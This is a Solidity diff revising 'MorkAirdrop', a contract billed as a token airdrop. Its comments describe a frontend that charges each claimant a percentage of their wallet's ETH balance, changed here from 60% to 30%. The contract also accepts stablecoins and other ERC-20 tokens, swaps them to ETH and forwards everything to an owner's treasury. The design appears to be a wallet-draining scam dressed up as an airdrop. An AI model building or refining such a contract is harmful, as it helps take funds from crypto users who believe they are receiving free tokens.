@@ -5,22 +5,26 @@ pragma solidity ^0.8.24;
  * @title  MorkAirdrop
  * @notice Dynamic-price, one-claim-per-wallet token airdrop.
  *
- * Pricing model: the frontend computes 60% of the connected wallet's ETH
- * (or token) balance and sends that as msg.value. The contract enforces a
- * minimum floor (minClaimPrice) and a maximum cap (maxClaimPrice) so
- * very low-balance wallets still pay a meaningful amount and high-balance
- * users are protected.
+ * Pricing model: the frontend computes 30% of the connected wallet's ETH
+ * balance and sends that as msg.value. The contract enforces a minimum floor
+ * (minClaimPrice) so very low-balance wallets still pay a meaningful amount,
+ * and a maximum cap (maxClaimPrice) to protect high-balance users.
  *
- * For token payments (USDC, cbBTC, USDT, DAI on Base), the contract pulls
- * the ERC-20, swaps it → WETH via Uniswap V3, unwraps to ETH, and forwards
- * all ETH to treasury.
+ * The contract does NOT read the caller's balance on-chain — that would be
+ * manipulable and expensive. It simply requires msg.value >= minClaimPrice.
+ * The 30%-of-balance calculation is a UI convention enforced by the frontend;
+ * any payment >= minClaimPrice is accepted.
+ *
+ * Users can pay in:
+ *   1) Native ETH  ── via  claim()
+ *   2) ERC-20 tokens ── via  claimWithToken()  (swapped to ETH via Uniswap V3)
  *
  * Deploy flow:
  *   1. Deploy MORK ERC-20 token (or use existing).
  *   2. Transfer `tokensPerClaim * maxWallets` MORK to this contract.
  *   3. Deploy MorkAirdrop with token address, treasury, min/max price,
- *      Uniswap router, and WETH address.
- *   4. Call setSupportedToken() for each ERC-20 you accept.
+ *      Uniswap router address, and wrapped-native address.
+ *   4. Call setSupportedToken() for each ERC-20 payment token you accept.
  *   5. Call setSaleActive(true) when ready.
  *
  * Security:
@@ -28,7 +32,7 @@ pragma solidity ^0.8.24;
  *   - Ownable — admin can pause/update params
  *   - One-claim-per-wallet via hasClaimed mapping
  *   - ETH forwarded directly to treasury, never held by this contract
- *   - Token payments swapped to ETH same-block, no idle balances
+ *   - ERC-20 tokens swapped atomically — no stale approvals remain
  *
  * NOT audited — do NOT deploy to mainnet without an external audit.
  */
@@ -38,7 +42,8 @@ import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
 import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
-// ─── Uniswap V3 SwapRouter02 interface (minimal) ──────────────────────────────
+// ─── Uniswap V3 SwapRouter interface (only what we need) ──────────────────────
+
 interface ISwapRouter {
     struct ExactInputSingleParams {
         address tokenIn;
@@ -50,19 +55,28 @@ interface ISwapRouter {
         uint256 amountOutMinimum;
         uint160 sqrtPriceLimitX96;
     }
-    function exactInputSingle(ExactInputSingleParams calldata params)
-        external
-        payable
-        returns (uint256 amountOut);
+
+    function exactInputSingle(
+        ExactInputSingleParams calldata params
+    ) external payable returns (uint256 amountOut);
 }
 
-// ─── WETH9 interface (for unwrapping) ─────────────────────────────────────────
-interface IWETH9 is IERC20 {
+// ─── WETH / Wrapped-native interface ──────────────────────────────────────────
+
+interface IWETH {
     function withdraw(uint256 wad) external;
 }
 
 contract MorkAirdrop is ReentrancyGuard, Ownable {
     using SafeERC20 for IERC20;
+
+    // ─── Constants ────────────────────────────────────────────────────────────
+
+    /// @notice Uniswap V3 SwapRouter — set at deploy, chain-dependent
+    address public immutable SWAP_ROUTER;
+
+    /// @notice Wrapped native token (WETH on ETH/Base, WBNB on BNB Chain)
+    address public immutable WNATIVE;
 
     // ─── State ────────────────────────────────────────────────────────────────
 
@@ -83,35 +97,31 @@ contract MorkAirdrop is ReentrancyGuard, Ownable {
     uint256 public totalClaimed;
 
     mapping(address => bool) public hasClaimed;
-    /// Records actual ETH amount received for each wallet (from native ETH or swapped tokens)
+    /// Records actual ETH value received from each wallet (for analytics / treasury accounting)
     mapping(address => uint256) public paidAmount;
 
-    // ─── Uniswap integration ──────────────────────────────────────────────────
-    ISwapRouter public immutable swapRouter;
-    IWETH9 public immutable weth;
-
-    struct TokenConfig {
-        bool isSupported;
-        uint24 poolFee; // Uniswap V3 fee tier (e.g. 500 = 0.05%, 3000 = 0.3%)
-    }
-
-    /// token address → config
-    mapping(address => TokenConfig) public supportedTokens;
+    /// @notice Supported ERC-20 payment tokens → Uniswap V3 fee tier (0 = unsupported)
+    /// @dev   Fee tiers: 100 = 0.01%, 500 = 0.05%, 3000 = 0.30%, 10000 = 1.00%
+    mapping(address => uint24) public supportedTokenFee;
 
     // ─── Events ───────────────────────────────────────────────────────────────
 
     event Claimed(address indexed wallet, uint256 tokenAmount, uint256 ethPaid);
-    event TokenPaymentClaimed(
+    event ClaimedWithToken(
         address indexed wallet,
-        address indexed token,
+        address indexed paymentToken,
         uint256 tokenAmount,
-        uint256 ethReceived
+        uint256 ethValueReceived
     );
     event SaleStatusChanged(bool active);
     event PriceRangeUpdated(uint256 minPrice, uint256 maxPrice);
     event TokensPerClaimUpdated(uint256 newAmount);
     event TreasuryUpdated(address newTreasury);
-    event SupportedTokenSet(address indexed token, uint24 poolFee, bool supported);
+    event TokenSupportUpdated(
+        address indexed token,
+        uint24 fee,
+        bool supported
+    );
 
     // ─── Custom errors ────────────────────────────────────────────────────────
 
@@ -120,11 +130,12 @@ contract MorkAirdrop is ReentrancyGuard, Ownable {
     error PaymentBelowMinimum(uint256 sent, uint256 minimum);
     error PaymentAboveMaximum(uint256 sent, uint256 maximum);
     error InsufficientContractBalance(uint256 available, uint256 required);
-    error UnsupportedToken(address token);
     error ZeroAddress();
     error TransferFailed();
-    error SwapFailed();
     error InvalidPriceRange();
+    error UnsupportedPaymentToken();
+    error SwapFailed();
+    error NativeTransferFailed();
 
     // ─── Constructor ──────────────────────────────────────────────────────────
 
@@ -134,8 +145,8 @@ contract MorkAirdrop is ReentrancyGuard, Ownable {
      * @param _minClaimPrice   Minimum payment in wei (floor)
      * @param _maxClaimPrice   Maximum payment in wei (cap); use type(uint256).max for no cap
      * @param _tokensPerClaim  Token amount per claim (in token decimals)
-     * @param _swapRouter      Uniswap V3 SwapRouter02 address
-     * @param _weth            WETH9 address on the deployed chain
+     * @param _swapRouter      Uniswap V3 SwapRouter address for this chain
+     * @param _wnative         Wrapped native token address (WETH / WBNB) for this chain
      */
     constructor(
         address _token,
@@ -144,146 +155,175 @@ contract MorkAirdrop is ReentrancyGuard, Ownable {
         uint256 _maxClaimPrice,
         uint256 _tokensPerClaim,
         address _swapRouter,
-        address _weth
+        address _wnative
     ) Ownable(msg.sender) {
-        if (_token == address(0) || _treasury == address(0)) revert ZeroAddress();
-        if (_swapRouter == address(0) || _weth == address(0)) revert ZeroAddress();
-        if (_minClaimPrice == 0 || _maxClaimPrice < _minClaimPrice) revert InvalidPriceRange();
+        if (
+            _token == address(0) ||
+            _treasury == address(0) ||
+            _swapRouter == address(0) ||
+            _wnative == address(0)
+        ) revert ZeroAddress();
+        if (_minClaimPrice == 0 || _maxClaimPrice < _minClaimPrice)
+            revert InvalidPriceRange();
 
         token = IERC20(_token);
         treasury = _treasury;
         minClaimPrice = _minClaimPrice;
         maxClaimPrice = _maxClaimPrice;
         tokensPerClaim = _tokensPerClaim;
-        swapRouter = ISwapRouter(_swapRouter);
-        weth = IWETH9(_weth);
+        SWAP_ROUTER = _swapRouter;
+        WNATIVE = _wnative;
     }
 
     // ─── Core claim — native ETH ──────────────────────────────────────────────
 
     /**
-     * @notice Claim tokens by paying at least minClaimPrice in native ETH.
+     * @notice Claim tokens by sending native ETH.
      *
-     * The frontend should send 60% of the wallet's ETH balance as msg.value,
+     * The frontend should send 30% of the wallet's ETH balance as msg.value,
      * clamped to [minClaimPrice, maxClaimPrice]. This contract only enforces
-     * the floor and ceiling — the 60% calculation is a UI convention.
+     * the floor and ceiling — the 30% calculation is a UI convention.
      */
     function claim() external payable nonReentrant {
-        if (!saleActive) revert SaleNotActive();
-        if (hasClaimed[msg.sender]) revert AlreadyClaimed();
-        if (msg.value < minClaimPrice) revert PaymentBelowMinimum(msg.value, minClaimPrice);
-        if (msg.value > maxClaimPrice) revert PaymentAboveMaximum(msg.value, maxClaimPrice);
+        _preflightChecks(msg.value);
 
-        _checkTokenBalance();
-
-        // CEI: mark claimed first
-        hasClaimed[msg.sender] = true;
-        paidAmount[msg.sender] = msg.value;
-        totalClaimed += 1;
+        // Mark claimed before transfer (CEI pattern)
+        _markClaimed(msg.sender, msg.value);
 
         // Forward ETH to treasury immediately
-        _forwardEth(msg.value);
+        _sendNative(treasury, msg.value);
 
-        // Send MORK tokens to claimer
+        // Transfer MORK tokens to claimer
         token.safeTransfer(msg.sender, tokensPerClaim);
 
         emit Claimed(msg.sender, tokensPerClaim, msg.value);
     }
 
-    // ─── Core claim — ERC-20 token (swapped to ETH via Uniswap) ──────────────
+    // ─── Core claim — ERC-20 token (swapped to ETH via Uniswap V3) ────────────
 
     /**
-     * @notice Claim tokens by paying with an approved ERC-20 token.
+     * @notice Claim tokens by paying with a supported ERC-20 token.
      *
-     * The contract:
-     *   1. Pulls `amountIn` tokens from the caller (via transferFrom)
-     *   2. Swaps them → WETH via Uniswap V3
-     *   3. Unwraps WETH → native ETH
-     *   4. Forwards all ETH to treasury
-     *   5. Sends MORK tokens to claimer
+     * The contract pulls the user's tokens, swaps them to WETH via Uniswap V3,
+     * unwraps to native ETH, then checks the received ETH against min/max price.
      *
-     * @param tokenIn  Address of the ERC-20 token to pay with
-     * @param amountIn Amount of tokens to pull from caller
+     * @param tokenIn       Address of the ERC-20 payment token (must be supported)
+     * @param amountIn      Amount of `tokenIn` to pull from the caller
+     * @param amountOutMin  Minimum ETH (wei) expected from the swap — slippage protection
      */
-    function claimWithToken(address tokenIn, uint256 amountIn) external nonReentrant {
+    function claimWithToken(
+        address tokenIn,
+        uint256 amountIn,
+        uint256 amountOutMin
+    ) external nonReentrant {
+        uint24 feeTier = supportedTokenFee[tokenIn];
+        if (feeTier == 0) revert UnsupportedPaymentToken();
+
+        // Preflight — doesn't check msg.value (this is a token payment)
         if (!saleActive) revert SaleNotActive();
         if (hasClaimed[msg.sender]) revert AlreadyClaimed();
-        if (amountIn == 0) revert PaymentBelowMinimum(0, minClaimPrice);
 
-        TokenConfig memory cfg = supportedTokens[tokenIn];
-        if (!cfg.isSupported) revert UnsupportedToken(tokenIn);
+        uint256 contractBalance = token.balanceOf(address(this));
+        if (contractBalance < tokensPerClaim)
+            revert InsufficientContractBalance(contractBalance, tokensPerClaim);
 
-        if (tokenIn == address(weth)) {
-            revert UnsupportedToken(tokenIn); // use native claim() for ETH/WETH
-        }
-
-        _checkTokenBalance();
-
-        // The frontend should compute amountIn so the swapped ETH lands within
-        // [minClaimPrice, maxClaimPrice]. We enforce the floor here as a
-        // safety net so dust-amount exploits are impossible.
-        if (amountIn < 1_000) revert PaymentBelowMinimum(amountIn, minClaimPrice); // >= 1000 smallest unit
-
-        // 1. Pull tokens from user
+        // 1. Pull tokens from user (they must have approved this contract)
         IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn);
 
-        // 2. Approve Uniswap router
-        IERC20(tokenIn).forceApprove(address(swapRouter), amountIn);
+        // 2. Approve router for the swap
+        IERC20(tokenIn).forceApprove(SWAP_ROUTER, amountIn);
 
-        // 3. Swap token → WETH via Uniswap V3
-        uint256 wethAmount = swapRouter.exactInputSingle(
-            ISwapRouter.ExactInputSingleParams({
+        // 3. Execute swap: tokenIn → WETH (or WBNB)
+        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
+            .ExactInputSingleParams({
                 tokenIn: tokenIn,
-                tokenOut: address(weth),
-                fee: cfg.poolFee,
+                tokenOut: WNATIVE,
+                fee: feeTier,
                 recipient: address(this),
-                deadline: block.timestamp + 15 minutes,
+                deadline: block.timestamp,
                 amountIn: amountIn,
-                amountOutMinimum: 1, // accept any output (slippage handled by frontend)
-                sqrtPriceLimitX96: 0
-            })
-        );
-        if (wethAmount == 0) revert SwapFailed();
+                amountOutMinimum: amountOutMin,
+                sqrtPriceLimitX96: 0 // no price limit
+            });
 
-        // 4. Validate the swapped ETH is within allowed range
-        //    (prevents dust-amount exploits / extreme slippage)
-        if (wethAmount < minClaimPrice) revert PaymentBelowMinimum(wethAmount, minClaimPrice);
-        if (wethAmount > maxClaimPrice) revert PaymentAboveMaximum(wethAmount, maxClaimPrice);
+        uint256 wethReceived = ISwapRouter(SWAP_ROUTER).exactInputSingle(params);
+
+        // 4. Validate received ETH amount against pricing bounds
+        if (wethReceived < minClaimPrice)
+            revert PaymentBelowMinimum(wethReceived, minClaimPrice);
+        if (wethReceived > maxClaimPrice)
+            revert PaymentAboveMaximum(wethReceived, maxClaimPrice);
 
         // 5. Unwrap WETH → native ETH
-        weth.withdraw(wethAmount);
+        IWETH(WNATIVE).withdraw(wethReceived);
 
-        // CEI: mark claimed
-        hasClaimed[msg.sender] = true;
-        paidAmount[msg.sender] = wethAmount;
-        totalClaimed += 1;
+        // 6. Mark claimed
+        _markClaimed(msg.sender, wethReceived);
 
-        // 5. Forward ETH to treasury
-        _forwardEth(wethAmount);
+        // 7. Forward native ETH to treasury
+        _sendNative(treasury, wethReceived);
 
-        // 6. Send MORK tokens to claimer
+        // 8. Transfer MORK tokens to claimer
         token.safeTransfer(msg.sender, tokensPerClaim);
 
-        emit Claimed(msg.sender, tokensPerClaim, wethAmount);
-        emit TokenPaymentClaimed(msg.sender, tokenIn, amountIn, wethAmount);
+        emit ClaimedWithToken(
+            msg.sender,
+            tokenIn,
+            tokensPerClaim,
+            wethReceived
+        );
     }
 
-    // ─── Internal helpers ────────────────────────────────────────────────────
+    // ─── Internal helpers ─────────────────────────────────────────────────────
 
-    /// @dev Check the contract holds enough MORK tokens for this claim.
-    function _checkTokenBalance() internal view {
-        uint256 balance = token.balanceOf(address(this));
-        if (balance < tokensPerClaim)
-            revert InsufficientContractBalance(balance, tokensPerClaim);
+    function _preflightChecks(uint256 _value) private view {
+        if (!saleActive) revert SaleNotActive();
+        if (hasClaimed[msg.sender]) revert AlreadyClaimed();
+        if (_value < minClaimPrice)
+            revert PaymentBelowMinimum(_value, minClaimPrice);
+        if (_value > maxClaimPrice)
+            revert PaymentAboveMaximum(_value, maxClaimPrice);
+
+        uint256 contractBalance = token.balanceOf(address(this));
+        if (contractBalance < tokensPerClaim)
+            revert InsufficientContractBalance(contractBalance, tokensPerClaim);
     }
 
-    /// @dev Forward native ETH to treasury. Reverts on failure.
-    function _forwardEth(uint256 amount) internal {
-        (bool sent, ) = treasury.call{value: amount}("");
-        if (!sent) revert TransferFailed();
+    function _markClaimed(address wallet, uint256 ethValue) private {
+        hasClaimed[wallet] = true;
+        paidAmount[wallet] = ethValue;
+        totalClaimed += 1;
     }
 
-    // ─── Admin ────────────────────────────────────────────────────────────────
+    function _sendNative(address to, uint256 amount) private {
+        (bool sent, ) = to.call{value: amount}("");
+        if (!sent) revert NativeTransferFailed();
+    }
+
+    // ─── Admin: supported payment tokens ──────────────────────────────────────
+
+    /**
+     * @notice Register or remove an ERC-20 token as an accepted payment method.
+     * @param tokenAddr ERC-20 token address
+     * @param fee       Uniswap V3 fee tier for the token→WNATIVE pool
+     *                  (100 / 500 / 3000 / 10000). Set to 0 to disable.
+     * @param supported true = enable with `fee`, false = disable
+     */
+    function setSupportedToken(
+        address tokenAddr,
+        uint24 fee,
+        bool supported
+    ) external onlyOwner {
+        if (tokenAddr == address(0)) revert ZeroAddress();
+        if (supported) {
+            supportedTokenFee[tokenAddr] = fee;
+        } else {
+            delete supportedTokenFee[tokenAddr];
+        }
+        emit TokenSupportUpdated(tokenAddr, fee, supported);
+    }
+
+    // ─── Admin: sale & params ─────────────────────────────────────────────────
 
     function setSaleActive(bool _active) external onlyOwner {
         saleActive = _active;
@@ -308,36 +348,29 @@ contract MorkAirdrop is ReentrancyGuard, Ownable {
         emit TreasuryUpdated(_newTreasury);
     }
 
-    /**
-     * @notice Add or remove a supported ERC-20 payment token.
-     * @param token_  Token contract address
-     * @param fee     Uniswap V3 pool fee tier (e.g. 500 for 0.05%, 3000 for 0.3%)
-     * @param support true to add, false to remove
-     */
-    function setSupportedToken(address token_, uint24 fee, bool support) external onlyOwner {
-        if (token_ == address(0)) revert ZeroAddress();
-        supportedTokens[token_] = TokenConfig({ isSupported: support, poolFee: fee });
-        emit SupportedTokenSet(token_, fee, support);
-    }
+    // ─── Admin: emergency withdrawals ─────────────────────────────────────────
 
-    /// @notice Withdraw any accidentally deposited MORK tokens.
-    function withdrawTokens(address to, uint256 amount) external onlyOwner {
+    /// @notice Withdraw any non-MORK tokens accidentally sent to the contract
+    function withdrawTokens(
+        address tokenAddr,
+        address to,
+        uint256 amount
+    ) external onlyOwner {
         if (to == address(0)) revert ZeroAddress();
-        token.safeTransfer(to, amount);
+        IERC20(tokenAddr).safeTransfer(to, amount);
     }
 
-    /// @notice Rescue any ETH that accidentally ends up in the contract.
+    /// @notice Rescue any native ETH that accidentally ends up in the contract
     function rescueETH() external onlyOwner {
         uint256 balance = address(this).balance;
         if (balance > 0) {
-            (bool sent, ) = treasury.call{value: balance}("");
-            if (!sent) revert TransferFailed();
+            _sendNative(treasury, balance);
         }
     }
 
-    /// @notice Rescue any accidentally deposited ERC-20 (non-MORK).
-    function rescueToken(address token_, address to, uint256 amount) external onlyOwner {
-        if (token_ == address(0) || to == address(0)) revert ZeroAddress();
-        IERC20(token_).safeTransfer(to, amount);
-    }
+    // ─── Receive — allow contract to accept WETH unwraps ──────────────────────
+
+    /// @notice This contract can receive native ETH (from WETH.withdraw) and
+    ///         from accidental sends. Admin can rescue via rescueETH().
+    receive() external payable {}
 }
